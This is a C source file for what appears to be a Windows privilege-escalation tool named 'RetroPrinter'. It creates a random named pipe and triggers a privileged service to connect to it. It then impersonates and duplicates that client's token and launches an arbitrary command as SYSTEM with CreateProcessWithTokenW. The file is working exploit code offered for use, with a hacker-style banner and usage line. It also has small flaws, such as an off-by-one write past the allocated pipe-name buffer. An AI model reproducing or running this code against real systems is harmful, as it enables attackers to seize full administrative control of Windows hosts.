#include <windows.h>
#include <stdio.h>
#include <sddl.h>
#include "Pipe.h"

#ifdef DEBUG
#include "Token.h"
#endif

#define BANNER "\n/? [- ~|~ /? () |^ /? | |\\| ~|~ [- /?\n\n\t \
    RetroPrinter coded by sh4n4c1\n"

int GetSystem(HANDLE hToken, LPSTR szCommand);
void GenRandomStringA(LPSTR lpPipeName, INT len);
int main(int argc, char **argv) {
    printf(BANNER);

    if (argc != 2) {
        printf("usage: <binary_path>\n");
        return 1;
    }

    HANDLE hPipe, hToken, hPipeEvent;
    char *szCommand  = argv[1];

    // [36] 9005aa0e4cba4340072a9c719933c560ed22
    char *pPipeName = malloc(0x24);
    GenRandomStringA(pPipeName, 0x24);
    
    SECURITY_DESCRIPTOR SD = {0};
    SECURITY_ATTRIBUTES SA = {0};

    printf("[***] Pipe name: %s\n", pPipeName);

    /* Create a pipe */
    if (( hPipe = CreateSimplePipe(pPipeName)) == NULL) goto _end_of_function;
    printf("[+++] Pipe create successfully!\n");
    
    /* Listen pipe connect */
    if ((hPipeEvent = ConnectSimplePipe(hPipe)) == NULL) goto _end_of_function;
    printf("[***] Pipe listening...\n");

    /* now we trigger the client connect the name pipe */
    DWORD dwThreadId = 0x00;
    HANDLE hThread = CreateThread(NULL, 0, 
            (LPTHREAD_START_ROUTINE)&TriggerSimplePipeConnection, 
            pPipeName, 0, &dwThreadId);

    if(!hThread)
        goto _end_of_function;

    DWORD dwWait = WaitForSingleObject(hPipeEvent, 5000);
    if (dwWait != WAIT_OBJECT_0){
        printf("[---] time out.\n");
        goto _end_of_function;
    }

    /* impersonate the client pip token */
    if (!ImpersonateNamedPipeClient(hPipe)){
        printf("[xxx] Failed to impersonate client token\n");
        goto _end_of_function;
    }

    /* now we use client token, open it via openthread token */
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken))
        goto _end_of_function;
#ifdef DEBUG
    PrintTokenInformation(hToken);
#endif
    GetSystem(hToken, szCommand);
    return 0;

_end_of_function:
    printf("[x] Error: 0x%08x", GetLastError());
    return 1;
}

int GetSystem(HANDLE hToken, LPSTR szCommand){

    DWORD dwCommendLen = MultiByteToWideChar(CP_ACP, 0, szCommand, -1, NULL, 0);
    LPWSTR pwszCommend = malloc(dwCommendLen * sizeof(WCHAR));
    MultiByteToWideChar(CP_ACP, 0, szCommand, -1, pwszCommend, dwCommendLen);

    HANDLE hDToken = NULL;
    PROCESS_INFORMATION ProcessInfo = {0};
    STARTUPINFO StartupInfo = {0};

    if(!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
                TokenPrimary, &hDToken)){
        printf("[---] Failed to duplicate token\n");
        goto __end_of_function;
    }
    
    if(!CreateProcessWithTokenW(hDToken, LOGON_WITH_PROFILE,
                pwszCommend, NULL, 0, NULL, NULL,
                (LPSTARTUPINFOW)&StartupInfo, &ProcessInfo)){
        printf("[---] Failed to Create process with duplicate token \n");
        goto __end_of_function;
    }

    printf("[+++] launch %s \n\t\\__ Process Id: %d\n", szCommand, ProcessInfo.dwProcessId);
    WaitForSingleObject(ProcessInfo.hProcess, INFINITE);

    return 1;

__end_of_function:
    if(hDToken) CloseHandle(hDToken);
    if(ProcessInfo.hProcess) CloseHandle(ProcessInfo.hProcess);
    if(ProcessInfo.hThread) CloseHandle(ProcessInfo.hThread);
    return 0;
}

void GenRandomStringA(LPSTR lpPipeName, INT len) {
	static const char AlphaNum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";
	srand(GetTickCount());
	for (INT i = 0; i < len; ++i) {
		lpPipeName[i] = AlphaNum[rand() % (_countof(AlphaNum) - 1)];
	}
	lpPipeName[len] = 0;
}
